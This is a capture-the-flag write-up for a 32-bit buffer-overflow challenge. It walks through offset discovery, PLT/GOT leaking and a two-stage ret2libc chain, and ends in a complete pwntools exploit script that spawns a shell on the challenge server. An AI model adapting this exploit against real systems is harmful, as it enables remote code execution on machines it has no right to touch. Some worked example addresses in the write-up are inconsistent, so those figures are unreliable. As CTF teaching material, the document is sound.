# No_u_r_not - CTF PWN Challenge Writeup

**Challenge:** No_u_r_not  
**Points:** 480  
**Category:** Binary Exploitation (PWN)  
**Server:** `nc 47.130.175.253 1002`  
**Flag:** `BOH25{u_r_n07_7h3r3_bu7_1_571ll_m1551n6_u}`

---

## Table of Contents
1. [Challenge Overview](#challenge-overview)
2. [Initial Analysis](#initial-analysis)
3. [Finding the Vulnerability](#finding-the-vulnerability)
4. [Understanding the Core Concepts](#understanding-the-core-concepts)
5. [Building the Exploit](#building-the-exploit)
6. [What We Did Wrong (Learning Points)](#what-we-did-wrong)
7. [Complete Exploit Script](#complete-exploit-script)
8. [Key Takeaways & Future Reference](#key-takeaways)

---

## Challenge Overview

This challenge involves exploiting a 32-bit binary with a buffer overflow vulnerability to gain remote code execution and read the flag.

**Files Provided:**
- `chall` - The vulnerable binary
- `Dockerfile` - Container configuration (CRITICAL - contains libc info!)
- `flag.txt` - Local test flag

---

## Initial Analysis

### Step 1: Check File Type and Security Features

```bash
cd ~/BOH2025/No_u_r_not
file chall
checksec chall
```

**Output Analysis:**
```
chall: ELF 32-bit LSB executable, Intel 80386, dynamically linked, stripped

RELRO           STACK CANARY      NX            PIE             
Partial RELRO   No canary found   NX enabled    No PIE
```

**What This Means:**

| Feature | Status | Impact |
|---------|--------|--------|
| **32-bit** | ✓ | Arguments passed on stack (not registers) |
| **No Canary** | ✓ | Can overflow without detection |
| **NX Enabled** | ✗ | Cannot execute shellcode on stack (need ROP/ret2libc) |
| **No PIE** | ✓ | Binary addresses are fixed (predictable) |
| **Partial RELRO** | ✓ | GOT is writable (can exploit if needed) |

**Attack Strategy Decision:**
- ❌ Shellcode injection (NX enabled)
- ❌ Direct system() call (ASLR - don't know addresses)
- ✅ **Two-stage ret2libc attack** (leak libc → call system)

---

### Step 2: Run the Binary

```bash
./chall
```

**Observations:**
1. Prints ASCII art banner
2. Asks: "Where are you?>" - **First input (validation)**
3. If validation passes, asks: "...heyyy, do u miss me?>" - **Second input (overflow point)**

**Testing validation:**
```bash
# Test wrong input
echo "wrong" | ./chall
# Output: "Sorry, We are not meant to be."

# Test correct input
echo "nournot122" | ./chall
# Output: "I found you!" + asks for second input
```

---

### Step 3: Analyze Validation Logic

```bash
# Find string comparison
strings chall | grep "nournot"
# Output: nournot

# Find comparison in code
objdump -d chall | grep "strncmp" -B 10 -A 10
```

**Validation Requirements (from reverse engineering):**
1. Input must be exactly **10 characters** long
2. First 7 characters must be `"nournot"`
3. Last 3 characters must be **digits**
4. The 3 digits must **sum to 5**

**Valid Examples:**
- `nournot122` (1+2+2=5) ✓
- `nournot113` (1+1+3=5) ✓
- `nournot500` (5+0+0=5) ✓
- `nournot311` (3+1+1=5) ✓

---

## Finding the Vulnerability

### Step 4: Locate Dangerous Functions

```bash
# Search for buffer overflow functions
objdump -d chall | grep -E "call.*@plt" | grep -E "(gets|strcpy|read|scanf)"
```

**Found:**
```
8048796: call   8048480 <read@plt>
```

**Why `read()` is vulnerable here:**
- `gets()` - Always dangerous (no bounds check)
- `strcpy()` - Always dangerous (no bounds check)
- `read()` - **Depends on buffer size vs read size**
- `fgets()` - Safe if size parameter is correct

---

### Step 5: Analyze the Vulnerable Function

```bash
# Disassemble the function containing read()
objdump -d chall -M intel | grep -B 30 "call.*<read@plt>"
```

**Key Assembly Code:**
```asm
8048772: push   ebp
8048773: mov    ebp,esp
8048775: sub    esp,0x78           ; Allocate 120 bytes stack frame
...
804878b: push   0x1388              ; arg3: count = 5000 bytes (!)
8048790: lea    eax,[ebp-0x6c]     ; arg2: buffer at ebp-108
8048793: push   eax
8048794: push   0x0                 ; arg1: fd = 0 (stdin)
8048796: call   8048480 <read@plt> ; read(0, buffer, 5000)
```

**Vulnerability Analysis:**
```
Buffer location: ebp - 0x6c = ebp - 108 bytes
Read size: 0x1388 = 5000 bytes
Overflow: 5000 - 108 = 4892 bytes overflow possible!
```

---

### Step 6: Calculate Overflow Offset

**Method 1: Using Cyclic Pattern (Most Reliable)**

```bash
# In gdb with pwndbg
pwndbg chall

# Generate cyclic pattern
pwndbg> cyclic 200

# Run and test
pwndbg> r
# Input validation: nournot122
# Input pattern: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

# After crash:
pwndbg> cyclic -l daab
# Output: Found at offset 112
```

**Method 2: Manual Calculation**

```
Stack Layout:
┌─────────────────┐
│ Return address  │ ← ebp + 4
│ Saved EBP       │ ← ebp + 0
│ Local variables │
│ Buffer (108)    │ ← ebp - 0x6c (ebp - 108)
└─────────────────┘

Offset calculation:
= (ebp + 4) - (ebp - 108)
= 4 + 108
= 112 bytes
```

**✅ Confirmed Offset: 112 bytes**

---

## Understanding the Core Concepts

### Why Two-Stage Attack?

**The Problem:**
```python
# We want to call:
system("/bin/sh")

# But we DON'T KNOW the addresses because of ASLR:
system_address = ???  # Changes every run!
binsh_address = ???   # Changes every run!
```

**ASLR Example:**
```
Run 1: libc_base = 0xf7e00000
Run 2: libc_base = 0xf7d00000  # Different!
Run 3: libc_base = 0xf7f00000  # Different!
```

**The Solution: Two-Stage Attack**
1. **Stage 1:** Leak a libc address → Calculate libc base
2. **Stage 2:** Use leaked address to call `system("/bin/sh")`

---

### Understanding PLT and GOT

**Question I Had:** What's the difference between PLT and GOT? Why do we need both?

**Answer:**

#### The Problem:
Your binary (`chall`) needs to call functions from libc (`puts`, `printf`, etc.), but libc is loaded at different addresses each time (ASLR).

#### The Solution: PLT + GOT

```
┌─────────────────────────────────────────────┐
│ Your Binary (chall)                         │
│                                             │
│  call 0x80484c0  ← Fixed address (PLT)     │
└────────────┬────────────────────────────────┘
             │
             ▼
┌─────────────────────────────────────────────┐
│ PLT (Procedure Linkage Table)               │
│ 0x80484c0: jmp [0x804a01c]  ← Jump via GOT │
└────────────┬────────────────────────────────┘
             │
             ▼
┌─────────────────────────────────────────────┐
│ GOT (Global Offset Table)                   │
│ 0x804a01c: 0xf7cfa2a0  ← Real libc address │
└────────────┬────────────────────────────────┘
             │
             ▼
┌─────────────────────────────────────────────┐
│ Libc (libc.so.6)                            │
│ 0xf7cfa2a0: <actual puts() code>           │
└─────────────────────────────────────────────┘
```

**Key Points:**
- **PLT addresses are FIXED** (we can call them: `0x80484c0`)
- **GOT stores RUNTIME addresses** (we can read them to leak libc)
- **First call:** GOT contains PLT address → resolver finds real function → updates GOT
- **Subsequent calls:** GOT contains real address → direct jump

**Finding PLT and GOT:**
```bash
# Find PLT addresses (functions we can CALL)
objdump -d chall | grep "@plt>:"
# Output: 080484c0 <puts@plt>:

# Find GOT addresses (addresses we can READ to leak)
objdump -R chall
# Output: 0804a01c  R_386_JUMP_SLOT   puts@GLIBC_2.0
```

---

### Understanding Stack Layout for Function Calls

**Question I Had:** Why is the return address in the middle of the stack? Why not just:
```
[function][argument]
```

**Answer:** This is how the CPU's `call` instruction works in 32-bit x86.

#### Normal Function Call in C:
```c
puts("Hello");
// Continue here after puts returns
```

#### What the CPU Does:
```asm
push offset "Hello"    ; Push argument
call puts              ; This does TWO things:
                       ;   1. Push return address
                       ;   2. Jump to puts
```

#### Stack During Call:
```
After 'push "Hello"':
┌──────────────┐
│ "Hello"      │ ← ESP (argument on stack)
└──────────────┘

After 'call puts' (call automatically pushes return address):
┌──────────────┐
│ return_addr  │ ← ESP (where to go after puts)
│ "Hello"      │ ← ESP+4 (argument)
└──────────────┘

Inside puts():
- puts() reads argument from [ESP+4]
- Does its work
- Executes 'ret' which pops return_addr and jumps there
```

#### In ROP (We Manually Build This):
```python
payload = flat(
    b'A' * 112,      # Overflow to reach return address
    puts_plt,        # EIP jumps here (like 'call puts')
    return_addr,     # We manually put return address here
    argument         # Argument for puts
)
```

**The key:** The `call` instruction AUTOMATICALLY pushes the return address. In ROP, we manually construct what `call` would do!

---

### Understanding Stack Cleanup with pop; ret

**Question I Had:** Why do we need `pop ebx; ret`? What does it actually do?

#### The Problem Without Cleanup:

```python
payload = flat(
    b'A' * 112,
    puts_plt,
    main_addr,      # We want to go here after puts
    puts_got        # Argument
)
```

**Execution trace:**

```
Initial stack after overflow:
Address       Value
0xbffff0fc:   0x80484c0  (puts_plt)    ← ESP starts here
0xbffff100:   0x80487A1  (main_addr)
0xbffff104:   0x804a01c  (puts_got)

Step 1: ret instruction (from our overflow)
EIP = [ESP] = 0x80484c0 (puts_plt)
ESP = ESP + 4 = 0xbffff100

Step 2: Inside puts()
- Reads argument from [ESP+4] = [0xbffff104] = puts_got ✓
- Prints the value at puts_got address ✓
- Executes 'ret'

Step 3: ret from puts()
EIP = [ESP] = [0xbffff100] = 0x80487A1 (main_addr) ✓
ESP = ESP + 4 = 0xbffff104

Step 4: Now at main
ESP = 0xbffff104 (pointing at puts_got = 0x804a01c)

Problem: If main tries to read from stack or call functions,
it will see GARBAGE (puts_got value) instead of clean stack!
```

**In this specific case, returning to main actually WORKS** because main's prologue resets the stack:

```asm
; Main function prologue:
0x80487A5: and esp, 0xfffffff0  ; Realigns ESP to 16-byte boundary!
0x80487AB: push ebp             ; Creates new clean frame
```

**But in general ROP chains, we need cleanup!**

#### With Cleanup Gadget:

```python
payload = flat(
    b'A' * 112,
    puts_plt,
    pop_ebx_ret,    # Cleanup gadget!
    puts_got,       # Argument (will be removed)
    main_addr       # Real next address
)
```

**Execution trace:**

```
Initial stack:
Address       Value
0xbffff0fc:   0x80484c0  (puts_plt)
0xbffff100:   0x8048465  (pop_ebx_ret)
0xbffff104:   0x804a01c  (puts_got)
0xbffff108:   0x80487A1  (main_addr)

After puts() ret:
ESP = 0xbffff100
EIP = 0x8048465 (pop_ebx_ret)

Execute 'pop ebx':
EBX = [ESP] = 0x804a01c (puts_got value goes into EBX)
ESP = ESP + 4 = 0xbffff104

Execute 'ret':
EIP = [ESP] = 0x80487A1 (main_addr) ✓
ESP = ESP + 4 = 0xbffff108 ✓

Result: Stack is now clean! puts_got was removed!
```

#### Visual Summary:

```
Think of stack as plates:
🍽️ main_addr      ← We want this
🍽️ puts_got       ← Garbage argument
     ↑
    ESP

pop instruction = "Remove one plate"
After pop: ESP points at main_addr ✓
```

**When You Need pop Gadget:**

| Scenario | Need Cleanup? | Why |
|----------|---------------|-----|
| 32-bit, 1 argument | ✓ | Need `pop <reg>; ret` |
| 32-bit, 2 arguments | ✓ | Need `pop; pop; ret` or `add esp, 8; ret` |
| 64-bit | Usually ✗ | Arguments in registers (rdi, rsi, rdx) |
| Returning to main | Sometimes ✗ | Main resets stack anyway |

**Finding pop Gadgets:**
```bash
ROPgadget --binary chall | grep "pop.*ret"
# Found: 0x08048465: pop ebx ; ret
```

---

### Why Return to Main, Not Vulnerable Function?

**Question I Had:** Why return to main (0x80487A1) instead of the vulnerable function (0x8048772)?

**Answer:**

#### Option 1: Return to Vuln Function (What I tried first)
```python
payload1 = flat(
    b'A' * 112,
    puts_plt,
    pop_ebx,
    puts_got,
    0x8048772  # Vulnerable function
)
```

**Problems:**
1. **Stack may be corrupted** from our ROP chain
2. **No validation check** - program flow is broken
3. **When vuln function returns**, it tries to return to corrupted stack

#### Option 2: Return to Main (Correct!)
```python
payload1 = flat(
    b'A' * 112,
    puts_plt,
    pop_ebx,
    puts_got,
    0x80487A1  # Main function
)
```

**Why this works:**
1. **Main resets the stack:**
   ```asm
   0x80487A5: and esp, 0xfffffff0  ; Realigns stack!
   0x80487AB: push ebp             ; New clean frame
   ```

2. **Program runs naturally:**
   ```
   Main → Prints banner
        → Calls validation
        → Asks "Where are you?>"
        → We send: nournot113
        → Validation passes
        → Calls vulnerable function
        → Asks for input
        → We send: Stage 2 exploit
   ```

3. **Clean execution environment** for our second payload

**Key Insight:** Main gives us a "clean restart" of the program!

---

## Building the Exploit

### Phase 1: Extract the Correct libc

**CRITICAL MISTAKE I MADE:** I tried to use the local Kali libc instead of extracting from Docker!

**Why Dockerfile is Important:**
- Challenge runs in Ubuntu 16.04 container
- Your local libc (Kali) is probably version 2.31+
- Server libc is version 2.23
- **Different versions = Different offsets = Exploit fails!**

#### Correct Process:

```bash
cd ~/BOH2025/No_u_r_not

# Build the Docker container
docker build -t no_u_r_not .

# Create a temporary container
docker run --name extract_libc no_u_r_not /bin/true

# Find libc location in container
docker run --name find_libc no_u_r_not find / -name "libc.so.6" 2>/dev/null
# Output: /srv/lib/i386-linux-gnu/libc.so.6

# Extract the ACTUAL libc file (not symlink!)
docker cp extract_libc:/srv/lib/i386-linux-gnu/libc-2.23.so ./libc_server.so.6

# Clean up
docker rm extract_libc find_libc

# Verify correct size (should be ~1.7MB)
ls -lh libc_server.so.6
# Output: -rwxr-xr-x 1 user user 1.7M libc_server.so.6
```

#### Verify Offsets:

```bash
# Find puts offset
readelf -s libc_server.so.6 | grep " puts@@"
# Output: 0005fcb0   464 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.0

# Find system offset
readelf -s libc_server.so.6 | grep " system@@"
# Output: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0

# Find /bin/sh string
strings -t x libc_server.so.6 | grep "/bin/sh"
# Output: 15bb2b /bin/sh
```

**Verify Leak Works:**

```bash
python3 << 'EOF'
# Test with leaked address from server
puts_leak = 0xf18a8cb0      # Example leak from server
printf_leak = 0xf1892680    # Another leak

# Calculate libc base using both
puts_offset = 0x5fcb0
printf_offset = 0x49680

base_from_puts = puts_leak - puts_offset
base_from_printf = printf_leak - printf_offset

print(f"Base from puts:   {hex(base_from_puts)}")
print(f"Base from printf: {hex(base_from_printf)}")

if base_from_puts == base_from_printf:
    print("✓ CORRECT LIBC!")
else:
    print("✗ WRONG LIBC!")
EOF
```

---

### Phase 2: Build Stage 1 (Leak)

#### Find Required Addresses:

```bash
# PLT addresses
objdump -d chall | grep "@plt>:"
# puts@plt:   0x080484c0
# printf@plt: 0x08048490

# GOT addresses
objdump -R chall
# puts@GOT:   0x0804a01c
# printf@GOT: 0x0804a010

# Main function
objdump -d chall | grep "<main>:" -A 5
# main:       0x080487A1

# ROP gadgets
ROPgadget --binary chall | grep "pop.*ret"
# pop ebx; ret: 0x08048465
```

#### Stage 1 Payload Structure:

```python
from pwn import *

elf = ELF('./chall')

# Addresses
puts_plt = 0x80484c0
puts_got = 0x804a01c
pop_ebx = 0x8048465
main = 0x80487A1

# Build leak payload
payload1 = flat(
    b'A' * 112,      # Padding to reach return address
    puts_plt,        # Call puts()
    pop_ebx,         # Clean up argument
    puts_got,        # Argument: print GOT entry
    main             # Return to main for stage 2
)
```

#### Test Stage 1 Locally:

```bash
python3 << 'EOF'
from pwn import *

elf = ELF('./chall')

puts_plt = 0x80484c0
puts_got = 0x804a01c
pop_ebx = 0x8048465
main = 0x80487A1

io = process('./chall')

# Pass validation
io.sendlineafter(b'> ', b'nournot113')

# Send leak payload
payload1 = flat(
    b'A' * 112,
    puts_plt,
    pop_ebx,
    puts_got,
    main
)
io.sendlineafter(b'> ', payload1)

# Receive leak
leaked = u32(io.recv(4))
print(f"[+] Leaked puts: {hex(leaked)}")

# Check if program restarts (asks for validation again)
try:
    io.recvuntil(b'Where are you', timeout=2)
    print("[+] Program restarted! Stage 1 works!")
except:
    print("[-] Program did not restart")

io.close()
EOF
```

**Expected Output:**
```
[+] Leaked puts: 0xf7cfa2a0
[+] Program restarted! Stage 1 works!
```

---

### Phase 3: Build Stage 2 (Exploit)

#### Calculate libc Addresses:

```python
# From Stage 1, we leaked puts address
leaked_puts = 0xf7cfa2a0  # Example

# Offsets from libc_server.so.6
puts_offset = 0x5fcb0
system_offset = 0x3ada0
binsh_offset = 0x15bb2b

# Calculate libc base
libc_base = leaked_puts - puts_offset
# libc_base = 0xf7c9a5f0

# Calculate target addresses
system_addr = libc_base + system_offset
# system_addr = 0xf7cd5390

binsh_addr = libc_base + binsh_offset
# binsh_addr = 0xf7df011b
```

#### Stage 2 Payload Structure:

```python
# After returning to main, we need to:
# 1. Pass validation AGAIN
# 2. Send exploit payload

payload2 = flat(
    b'A' * 112,      # Padding
    system_addr,     # Call system()
    0xdeadbeef,      # Fake return address (doesn't matter)
    binsh_addr       # Argument: "/bin/sh"
)
```

**Stack Layout When system() Executes:**
```
┌──────────────┐
│ binsh_addr   │ ← [ESP+4] = Argument for system
│ 0xdeadbeef   │ ← [ESP] = Return address (unused)
│ system_addr  │ ← EIP (executing system)
└──────────────┘

system() reads its argument from [ESP+4]
system("/bin/sh") spawns a shell!
```

---

## Complete Exploit Script

```python
#!/usr/bin/env python3
from pwn import *

# ============================================
# CONFIGURATION
# ============================================
BINARY = './chall'
LIBC = './libc_server.so.6'
HOST = '47.130.175.253'
PORT = 1002

# Load binaries
elf = context.binary = ELF(BINARY)
libc = ELF(LIBC)

# Connect
if args.LOCAL:
    io = process(BINARY)
else:
    io = remote(HOST, PORT)

# ============================================
# ADDRESSES
# ============================================
# PLT addresses (functions we can call)
puts_plt = elf.plt['puts']          # 0x80484c0
printf_plt = elf.plt['printf']      # 0x8048490

# GOT addresses (where real addresses are stored)
puts_got = elf.got['puts']          # 0x804a01c
printf_got = elf.got['printf']      # 0x804a010

# Binary addresses
main = 0x80487A1                     # Main function

# ROP gadgets
pop_ebx = 0x8048465                  # pop ebx; ret

# Validation string
VALIDATION = b'nournot113'

# ============================================
# STAGE 1: LEAK LIBC ADDRESS
# ============================================
log.info("=" * 50)
log.info("STAGE 1: Leaking libc address")
log.info("=" * 50)

# Pass validation
io.sendlineafter(b'> ', VALIDATION)

# Build ROP chain to leak puts address
rop = flat(
    b'A' * 112,      # Padding to return address
    puts_plt,        # Call puts()
    pop_ebx,         # Clean up stack (pop argument)
    puts_got,        # Argument: print puts GOT entry
    main             # Return to main for stage 2
)

# Send leak payload
io.sendlineafter(b'> ', rop)

# Receive leaked address
leaked_puts = u32(io.recv(4))
log.success(f"Leaked puts:   {hex(leaked_puts)}")

# Calculate libc base
libc.address = leaked_puts - libc.sym.puts
log.success(f"Libc base:     {hex(libc.address)}")
log.success(f"system:        {hex(libc.sym.system)}")
log.success(f"/bin/sh:       {hex(next(libc.search(b'/bin/sh')))}")

# ============================================
# STAGE 2: CALL SYSTEM("/bin/sh")
# ============================================
log.info("=" * 50)
log.info("STAGE 2: Calling system('/bin/sh')")
log.info("=" * 50)

# Pass validation again (program restarted at main)
io.sendlineafter(b'> ', VALIDATION)

# Build ROP chain to call system("/bin/sh")
rop2 = flat(
    b'A' * 112,                      # Padding
    libc.sym.system,                 # Call system()
    0xdeadbeef,                      # Fake return address
    next(libc.search(b'/bin/sh'))    # Argument: "/bin/sh"
)

# Send exploit payload
io.sendlineafter(b'> ', rop2)

# ============================================
# INTERACT WITH SHELL
# ============================================
log.success("Shell spawned! Enjoy :)")
log.info("Try: ls, cat /app/flag.txt")
io.interactive()
```

### Running the Exploit:

```bash
# Local testing
python3 exploit.py LOCAL

# Remote attack
python3 exploit.py

# Or explicitly
python3 exploit.py REMOTE
```

### Getting the Flag:

```bash
$ ls
flag.txt
run

$ cat /app/flag.txt
BOH25{u_r_n07_7h3r3_bu7_1_571ll_m1551n6_u}
```

---

## What We Did Wrong (Learning Points)

### ❌ Mistake 1: Used Wrong libc File

**What I Did:**
```python
libc = ELF("./libc.so.6")  # My local Kali libc
```

**What Happened:**
- Local libc is version 2.31+
- Server uses libc version 2.23
- Different offsets → shell spawned at wrong address → crash

**Correct Approach:**
1. **Always check if Dockerfile is provided!**
2. Extract libc from Docker container:
   ```bash
   docker build -t challenge .
   docker cp container:/srv/lib/i386-linux-gnu/libc-2.23.so ./
   ```
3. Use the extracted libc in exploit

**Lesson:** The Dockerfile is the MOST IMPORTANT file in a pwn challenge!

---

### ❌ Mistake 2: Returned to Vuln Function Instead of Main

**What I Did:**
```python
payload1 = flat(
    b'A' * 112,
    puts_plt,
    pop_ebx,
    puts_got,
    0x8048772  # Vulnerable function
)
```

**What Happened:**
- Stack was corrupted from ROP chain
- Program flow was broken
- No clean state for second exploit

**Correct Approach:**
```python
payload1 = flat(
    b'A' * 112,
    puts_plt,
    pop_ebx,
    puts_got,
    0x80487A1  # Main function
)
```

**Why Main is Better:**
1. Main resets and realigns the stack
2. Program runs through normal flow
3. Asks for validation again (expected behavior)
4. Clean environment for stage 2

**Lesson:** Return to a function that resets program state, not just the vulnerable function!

---

### ❌ Mistake 3: Didn't Test Locally First

**What I Did:**
- Wrote exploit
- Tested directly on remote server
- Wasted time debugging blind

**Correct Approach:**
1. **Test locally first:**
   ```bash
   ./chall
   python3 exploit.py LOCAL
   ```
2. **Test in Docker:**
   ```bash
   docker run -p 5000:5000 challenge
   python3 exploit.py # connect to localhost:5000
   ```
3. **Then test remote:**
   ```bash
   python3 exploit.py REMOTE
   ```

**Lesson:** Always test locally before attacking remote!

---

### ❌ Mistake 4: Didn't Verify Libc Offsets

**What I Did:**
- Assumed libc offsets without verification
- Exploit failed silently

**Correct Approach:**
```python
# After leaking, verify calculation
leaked_puts = 0xf18a8cb0
puts_offset = 0x5fcb0
printf_offset = 0x49680

# Test with multiple functions
base_from_puts = leaked_puts - puts_offset
base_from_printf = leaked_printf - printf_offset

if base_from_puts == base_from_printf:
    print("✓ Offsets are correct!")
else:
    print("✗ Wrong libc file!")
```

**Lesson:** Verify your libc offsets match before building stage 2!

---

## Key Takeaways & Future Reference

### 🎯 Essential Pwn Checklist

Before starting ANY pwn challenge:

```
[ ] 1. Check security features (checksec)
[ ] 2. Run the binary to understand behavior
[ ] 3. Find vulnerable functions (gets, strcpy, read, etc.)
[ ] 4. Calculate overflow offset (cyclic pattern)
[ ] 5. Check if Dockerfile provided → EXTRACT LIBC!
[ ] 6. Identify attack strategy (shellcode/ROP/ret2libc)
[ ] 7. Find required addresses (PLT, GOT, gadgets)
[ ] 8. Build and test locally first
[ ] 9. Verify libc offsets match
[ ] 10. Attack remote server
```

---

### 📝 Notes to Remember

#### When to Use What:

| Security Feature | Attack Strategy |
|------------------|-----------------|
| No NX | Shellcode injection |
| NX + No PIE | ROP with fixed addresses |
| NX + PIE | Leak addresses + ROP |
| NX + ASLR | Two-stage ret2libc (leak → exploit) |
| Canary | Leak canary or find bug that bypasses it |

#### 32-bit vs 64-bit:

| Feature | 32-bit | 64-bit |
|---------|--------|--------|
| Arguments | Stack | Registers (rdi, rsi, rdx, rcx, r8, r9) |
| Cleanup | Need `pop; ret` | Usually not needed |
| Gadgets | `pop ebx; ret` | `pop rdi; ret` |

#### Always Extract libc When:

1. ✅ Dockerfile is provided
2. ✅ Challenge involves ret2libc
3. ✅ ASLR is enabled
4. ✅ You need accurate function offsets

#### Return to Main When:

1. ✅ You need a clean stack for stage 2
2. ✅ Program has validation logic you need to pass again
3. ✅ You want reliable exploit execution

---

### 🔧 Essential Commands

```bash
# ===== BINARY ANALYSIS =====
file binary
checksec binary
strings binary
objdump -d binary -M intel

# ===== FIND ADDRESSES =====
# PLT functions (we can call these)
objdump -d binary | grep "@plt>:"

# GOT entries (we can read these to leak)
objdump -R binary

# ROP gadgets
ROPgadget --binary binary | grep "pop.*ret"

# ===== LIBC ANALYSIS =====
# Extract from Docker
docker build -t challenge .
docker run --name temp challenge /bin/true
docker cp temp:/path/to/libc.so.6 ./

# Find function offsets
readelf -s libc.so.6 | grep " puts@@"
readelf -s libc.so.6 | grep " system@@"

# Find strings
strings -t x libc.so.6 | grep "/bin/sh"

# ===== TESTING =====
# Calculate offset
python3 -c "from pwn import *; print(cyclic(200))" | ./binary

# In gdb
gdb binary
> cyclic 200
> r
> cyclic -l [crashed_value]

# ===== DOCKER =====
# Build container
docker build -t challenge .

# Run locally
docker run -p 5000:5000 challenge

# Extract files
docker cp container:/path/to/file ./
```

---

### 💡 Common Pitfalls to Avoid

1. **Don't assume libc version** - Always extract from Docker
2. **Don't skip local testing** - Test locally before remote
3. **Don't forget validation** - If program checks input, you need to pass it EVERY time
4. **Don't ignore stack alignment** - Use `pop; ret` gadgets when needed
5. **Don't hardcode addresses** - Use pwntools to calculate offsets
6. **Don't give up on leaks** - If one GOT entry doesn't work, try another

---

### 🚀 Advanced Tips

#### Using pwntools Shortcuts:

```python
# Instead of manual calculation:
libc.address = leaked_puts - libc.sym.puts

# Then use:
libc.sym.system          # Auto-calculates system address
next(libc.search(b'/bin/sh'))  # Auto-finds /bin/sh
```

#### Debugging with gdb:

```python
# Add to exploit script
if args.GDB:
    gdb.attach(io, '''
        break *0x8048796
        continue
    ''')
```

#### Multiple Leaks for Verification:

```python
# Leak multiple functions to be sure
leaked_puts = leak_function(puts_got)
leaked_printf = leak_function(printf_got)

# Both should give same libc base
base1 = leaked_puts - libc.sym.puts
base2 = leaked_printf - libc.sym.printf

assert base1 == base2, "Libc version mismatch!"
```

---

### 📚 Additional Resources

- **pwntools documentation:** https://docs.pwntools.com/
- **libc database:** https://libc.blukat.me/
- **ROP gadget finder:** https://github.com/JonathanSalwan/ROPgadget
- **Nightmare (pwn course):** https://guyinatuxedo.github.io/

---

## Summary

This challenge taught me:

1. ✅ **Always extract libc from Dockerfile** - Different versions = different offsets
2. ✅ **Two-stage attacks for ASLR** - Leak addresses first, exploit second
3. ✅ **Return to main for clean state** - Better than returning to vulnerable function
4. ✅ **Understand PLT/GOT** - PLT for calling, GOT for leaking
5. ✅ **Stack cleanup with pop gadgets** - Remove arguments after function calls
6. ✅ **Test locally before remote** - Save time debugging

**The most important lesson:** Read the Dockerfile first and extract the correct libc!

---

**Flag:** `BOH25{u_r_n07_7h3r3_bu7_1_571ll_m1551n6_u}`
